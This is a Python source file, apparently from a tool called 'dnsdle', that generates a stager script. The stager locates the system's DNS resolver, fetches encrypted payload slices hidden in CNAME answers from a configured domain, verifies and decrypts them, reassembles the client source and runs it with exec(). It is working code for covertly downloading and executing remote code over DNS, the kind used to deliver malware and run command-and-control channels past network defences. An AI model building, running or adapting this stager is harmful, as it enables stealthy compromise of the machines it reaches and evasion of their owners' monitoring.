from __future__ import absolute_import, unicode_literals

from dnsdle.extract import extract_functions


_STAGER_HEADER = '''#!/usr/bin/env python
# -*- coding: ascii -*-
import base64
import hashlib
import hmac
import random
import socket
import struct
import subprocess
import sys
import time
import zlib

DOMAIN_LABELS = @@DOMAIN_LABELS@@
FILE_TAG = @@FILE_TAG@@
FILE_ID = @@FILE_ID@@
PUBLISH_VERSION = @@PUBLISH_VERSION@@
TOTAL_SLICES = @@TOTAL_SLICES@@
COMPRESSED_SIZE = @@COMPRESSED_SIZE@@
PLAINTEXT_SHA256_HEX = @@PLAINTEXT_SHA256_HEX@@
MAPPING_SEED = @@MAPPING_SEED@@
SLICE_TOKEN_LEN = @@SLICE_TOKEN_LEN@@
RESPONSE_LABEL = @@RESPONSE_LABEL@@
DNS_EDNS_SIZE = @@DNS_EDNS_SIZE@@
PSK = @@PSK@@
DOMAINS_STR = @@DOMAINS_STR@@
FILE_TAG_LEN = @@FILE_TAG_LEN@@

PAYLOAD_PUBLISH_VERSION = @@PAYLOAD_PUBLISH_VERSION@@
PAYLOAD_TOTAL_SLICES = @@PAYLOAD_TOTAL_SLICES@@
PAYLOAD_COMPRESSED_SIZE = @@PAYLOAD_COMPRESSED_SIZE@@
PAYLOAD_SHA256 = @@PAYLOAD_SHA256@@
PAYLOAD_TOKEN_LEN = @@PAYLOAD_TOKEN_LEN@@

try:
    text_type = unicode
    binary_type = str
except NameError:
    text_type = str
    binary_type = bytes

DnsParseError = ValueError
DNS_POINTER_TAG = 0xC0
PAYLOAD_ENC_KEY_LABEL = b"dnsdle-enc-v1|"
PAYLOAD_ENC_STREAM_LABEL = b"dnsdle-enc-stream-v1|"
PAYLOAD_MAC_KEY_LABEL = b"dnsdle-mac-v1|"
PAYLOAD_MAC_MESSAGE_LABEL = b"dnsdle-mac-msg-v1|"
PAYLOAD_MAC_TRUNC_LEN = 8
MAPPING_SLICE_LABEL = b"dnsdle:slice:v1|"

'''


_STAGER_DNS_OPS = '''

# Encode DNS name to wire format
def _encode_name(labels):
    parts = []
    for label in labels:
        raw = encode_ascii(label)
        parts.append(struct.pack("!B", len(raw)))
        parts.append(raw)
    parts.append(b"\\x00")
    return b"".join(parts)


# Build DNS query for QTYPE A with optional EDNS OPT record
def _build_query(qid, labels):
    qname = _encode_name(labels)
    question = qname + struct.pack("!HH", 1, 1)
    use_edns = DNS_EDNS_SIZE > 512
    arcount = 1 if use_edns else 0
    header = struct.pack("!HHHHHH", qid & 0xFFFF, 0x0100, 1, 0, 0, arcount)
    pkt = header + question
    if use_edns:
        pkt += b"\\x00" + struct.pack("!HHIH", 41, DNS_EDNS_SIZE, 0, 0)
    return pkt


# Parse DNS response and extract CNAME target labels
def _parse_cname(msg, qid, qname_labels):
    rid, flags, qdcount, ancount = struct.unpack("!HHHH", msg[:8])
    if rid != (qid & 0xFFFF):
        raise ValueError("id", rid, qid & 0xFFFF)
    if not (flags & 0x8000):
        raise ValueError("qr", flags)
    if flags & 0x0200:
        raise ValueError("tc", flags)
    if flags & 0x7800:
        raise ValueError("op", flags)
    if (flags & 0x000F) != 0:
        raise ValueError("rc", flags & 0xF)
    if qdcount != 1:
        raise ValueError("qd", qdcount)
    off = 12
    _qlabels, off = _decode_name(msg, off)
    off += 4
    expected = tuple(qname_labels)
    cname = None
    for _i in range(ancount):
        rr_name, off = _decode_name(msg, off)
        rr_type, rr_class, _ttl, rdlen = struct.unpack("!HHIH", msg[off:off + 10])
        off += 10
        rdata_off = off
        off += rdlen
        if rr_type == 5 and rr_class == 1 and rr_name == expected:
            cname, _ce = _decode_name(msg, rdata_off)
    if cname is None:
        raise ValueError("no_cname", ancount)
    return cname


# Extract payload text from CNAME target
def _extract_payload(cname_labels):
    suffix = (RESPONSE_LABEL,) + tuple(DOMAIN_LABELS)
    slen = len(suffix)
    if len(cname_labels) <= slen:
        raise ValueError("short_cname", cname_labels)
    if tuple(cname_labels[-slen:]) != suffix:
        raise ValueError("bad_suffix", cname_labels)
    return "".join(cname_labels[:-slen])


# Send DNS query over UDP and return response
def _send_query(addr, pkt):
    _af = socket.AF_INET6 if ":" in addr[0] else socket.AF_INET
    sock = socket.socket(_af, socket.SOCK_DGRAM)
    try:
        sock.settimeout(5.0)
        sock.sendto(pkt, addr)
        resp, _src = sock.recvfrom(max(2048, DNS_EDNS_SIZE + 2048))
    finally:
        try:
            sock.close()
        except Exception:
            pass
    return resp


# Parse binary record, verify MAC, decrypt slice
def _process_slice(ek, mk, si, payload_text):
    record = base32_decode_no_pad(payload_text)
    ba = bytearray(record)
    if ba[0] != 0x01:
        raise ValueError("ver", ba[0])
    if ba[1] != 0x00:
        raise ValueError("rsvd", ba[1])
    clen = struct.unpack("!H", record[2:4])[0]
    if clen == 0:
        raise ValueError("zero_ct")
    if 4 + clen + 8 != len(record):
        raise ValueError("rec_sz", len(record), 4 + clen + 8)
    ciphertext = record[4:4 + clen]
    mac = record[4 + clen:]
    mac_msg = (
        PAYLOAD_MAC_MESSAGE_LABEL
        + encode_ascii(FILE_ID) + b"|"
        + encode_ascii(PUBLISH_VERSION) + b"|"
        + encode_ascii_int(si, "slice_index") + b"|"
        + encode_ascii_int(TOTAL_SLICES, "total_slices") + b"|"
        + encode_ascii_int(COMPRESSED_SIZE, "compressed_size") + b"|"
        + ciphertext
    )
    em = hmac_sha256(mk, mac_msg)[:PAYLOAD_MAC_TRUNC_LEN]
    if not constant_time_equals(em, mac):
        raise ValueError("mac", si)
    stream = _keystream_bytes(ek, FILE_ID, PUBLISH_VERSION, si, clen)
    return _xor_bytes(ciphertext, stream)

'''


_STAGER_DISCOVER = '''
def _discover_resolver():
    if sys.platform == "win32":
        _hosts = _load_windows_resolvers()
    else:
        _hosts = _load_unix_resolvers()
    for _h in _hosts:
        for _af in (socket.AF_INET, socket.AF_INET6):
            try:
                _ai = socket.getaddrinfo(_h, 53, _af, socket.SOCK_DGRAM)
                if _ai:
                    return _ai[0][4][:2]
            except Exception:
                continue
    raise ValueError("no resolver")

'''


_STAGER_SUFFIX = '''# __RUNTIME__
_sa = sys.argv[1:]
verbose = "--verbose" in _sa
psk = None
resolver = None
_i = 0
while _i < len(_sa):
    if _sa[_i] == "--psk" and _i + 1 < len(_sa):
        psk = _sa[_i + 1]
        _i += 2
    elif _sa[_i] == "--resolver" and _i + 1 < len(_sa):
        resolver = _sa[_i + 1]
        _i += 2
    else:
        _i += 1
if not psk:
    psk = PSK
if not resolver:
    addr = _discover_resolver()
    if ":" in addr[0]:
        resolver = "[%s]:%d" % addr
    else:
        resolver = "%s:%d" % addr
else:
    host = resolver
    port = 53
    if resolver.startswith("["):
        _end = resolver.find("]")
        host = resolver[1:_end]
        _rest = resolver[_end + 1:]
        if _rest.startswith(":"):
            port = int(_rest[1:])
    elif resolver.count(":") == 1:
        host, _port_s = resolver.rsplit(":", 1)
        port = int(_port_s)
    addr = (host, port)
if verbose:
    sys.stderr.write("resolver %s\\n" % repr(addr))
ek = _derive_file_bound_key(psk, FILE_ID, PUBLISH_VERSION, PAYLOAD_ENC_KEY_LABEL)
mk = _derive_file_bound_key(psk, FILE_ID, PUBLISH_VERSION, PAYLOAD_MAC_KEY_LABEL)
_deadline = time.time() + 60
slices = {}
for si in range(TOTAL_SLICES):
    while True:
        if time.time() > _deadline:
            sys.exit(1)
        try:
            qname = (_derive_slice_token(encode_ascii(MAPPING_SEED), PUBLISH_VERSION, si, SLICE_TOKEN_LEN), FILE_TAG) + tuple(DOMAIN_LABELS)
            qid = random.randint(0, 0xFFFF)
            pkt = _build_query(qid, qname)
            resp = _send_query(addr, pkt)
            cname = _parse_cname(resp, qid, qname)
            payload = _extract_payload(cname)
            slices[si] = _process_slice(ek, mk, si, payload)
            if verbose:
                sys.stderr.write("[%d/%d]\\n" % (si + 1, TOTAL_SLICES))
            _deadline = time.time() + 60
            break
        except Exception:
            if verbose:
                sys.stderr.write("retry %d\\n" % si)
            time.sleep(1)
compressed = b"".join(slices[i] for i in range(TOTAL_SLICES))
if len(compressed) != COMPRESSED_SIZE:
    raise ValueError("sz", len(compressed), COMPRESSED_SIZE)
plaintext = zlib.decompress(compressed)
if hashlib.sha256(plaintext).hexdigest().lower() != PLAINTEXT_SHA256_HEX:
    raise ValueError("sha256")
client_source = plaintext
if not isinstance(client_source, str):
    client_source = client_source.decode("ascii")
sys.argv = [
    "c",
    "--psk", psk,
    "--domains", DOMAINS_STR,
    "--mapping-seed", MAPPING_SEED,
    "--publish-version", PAYLOAD_PUBLISH_VERSION,
    "--total-slices", str(PAYLOAD_TOTAL_SLICES),
    "--compressed-size", str(PAYLOAD_COMPRESSED_SIZE),
    "--sha256", PAYLOAD_SHA256,
    "--token-len", str(PAYLOAD_TOKEN_LEN),
    "--file-tag-len", str(FILE_TAG_LEN),
    "--response-label", RESPONSE_LABEL,
    "--dns-edns-size", str(DNS_EDNS_SIZE),
    "--resolver", resolver,
] + _sa
exec(client_source)
'''


def build_stager_template():
    encoding = extract_functions("compat.py", [
        "encode_ascii", "encode_utf8", "decode_ascii", "encode_ascii_int",
        "is_binary", "base32_lower_no_pad", "base32_decode_no_pad",
        "constant_time_equals",
    ])
    crypto = extract_functions("helpers.py", [
        "hmac_sha256", "_derive_slice_token",
    ])
    crypto += extract_functions("cname_payload.py", [
        "_derive_file_bound_key", "_keystream_bytes", "_xor_bytes",
    ])
    dns = extract_functions("dnswire.py", ["_decode_name"])
    resolvers = extract_functions("resolver_linux.py", [
        "_load_unix_resolvers",
    ])
    resolvers += extract_functions("resolver_windows.py", [
        "_run_nslookup", "_parse_nslookup_output", "_load_windows_resolvers",
    ])
    extracted = "\n\n".join(encoding + crypto + dns + resolvers)
    return (
        _STAGER_HEADER
        + extracted + "\n"
        + _STAGER_DNS_OPS
        + _STAGER_DISCOVER
        + _STAGER_SUFFIX
    )
